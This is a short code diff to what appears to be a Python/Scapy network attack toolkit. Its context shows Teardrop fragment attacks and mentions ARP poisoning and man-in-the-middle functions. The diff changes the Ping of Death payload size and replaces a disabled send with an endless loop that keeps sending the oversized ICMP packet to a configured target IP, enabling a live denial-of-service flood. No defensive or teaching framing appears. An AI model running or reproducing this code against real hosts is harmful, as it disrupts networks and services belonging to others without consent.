@@ -61,7 +61,7 @@ def TeardropAttack(ipDestination):
     packet2 = IP(dst=ipDestination, id=12, frag=2) / UDP() / ("X" * 2)
     return packet1, packet2
 def PingOfDeath(ipDestination):
-    packet = IP(dst=ipDestination) / ICMP() / ("X" * 65508)
+    packet = IP(dst=ipDestination) / ICMP() / ("X" * 65000)
     return packet
 
 # Man in the Middle Attacks
@@ -157,8 +157,8 @@ def RunTeardropAttack():
     return "TeardropAttack"
 def RunPingOfDeath():
     packet = PingOfDeath(config.targetIPDestination)
-    #send(packet)
-    print("---Fix PingOfDeath---")
+    while True:
+        send(packet)
     return "PingOfDeath"
 def RunARPPoisoning():
     packets = ARPPoisoning()
